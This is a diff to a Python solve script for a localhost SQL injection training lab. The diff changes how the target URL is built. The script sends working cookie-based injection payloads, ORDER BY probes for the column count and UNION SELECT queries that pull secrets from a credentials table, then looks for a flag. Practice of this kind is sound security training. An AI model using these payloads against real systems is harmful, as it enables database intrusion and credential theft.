@@ -7,16 +7,16 @@ The application reads the cookie value and uses it directly in a
 SQL query without sanitization.
 
 Usage:
-    python3 lab17_header_cookie.py [TARGET_URL]
+    python3 lab17_header_cookie.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 import re
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS = {"lab": "mysql/lab17", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab17"
 
 
 def step1_confirm_injection():
@@ -24,7 +24,7 @@ def step1_confirm_injection():
     print("[*] Step 1: Confirming cookie injection point...")
 
     # Normal cookie
-    r = requests.get(TARGET, params=PARAMS, cookies={"user_id": "user1"})
+    r = requests.get(TARGET, cookies={"user_id": "user1"})
     if "dark" in r.text or "Theme" in r.text:
         print("[+] Normal cookie works -- user preferences returned")
     else:
@@ -33,7 +33,7 @@ def step1_confirm_injection():
     # Test ORDER BY to find column count
     for n in range(1, 6):
         cookie = f"' ORDER BY {n} -- -"
-        r = requests.get(TARGET, params=PARAMS, cookies={"user_id": cookie})
+        r = requests.get(TARGET, cookies={"user_id": cookie})
         if "error" in r.text.lower() or "Error" in r.text:
             print(f"[+] ORDER BY {n} failed → query has {n-1} columns")
             return n - 1
@@ -50,7 +50,7 @@ def step2_union_extract(num_cols):
     print(f"[*] Cookie payload: user_id={payload}")
     print()
 
-    r = requests.get(TARGET, params=PARAMS, cookies={"user_id": payload})
+    r = requests.get(TARGET, cookies={"user_id": payload})
 
     # Look for the flag
     match = re.search(r"FLAG\{[^}]+\}", r.text)
@@ -64,7 +64,7 @@ def step2_union_extract(num_cols):
         "' UNION SELECT secret, 2, 3 FROM credentials WHERE service='database' -- -",
     ]
     for alt in alternatives:
-        r = requests.get(TARGET, params=PARAMS, cookies={"user_id": alt})
+        r = requests.get(TARGET, cookies={"user_id": alt})
         match = re.search(r"FLAG\{[^}]+\}", r.text)
         if match:
             return match.group(0)
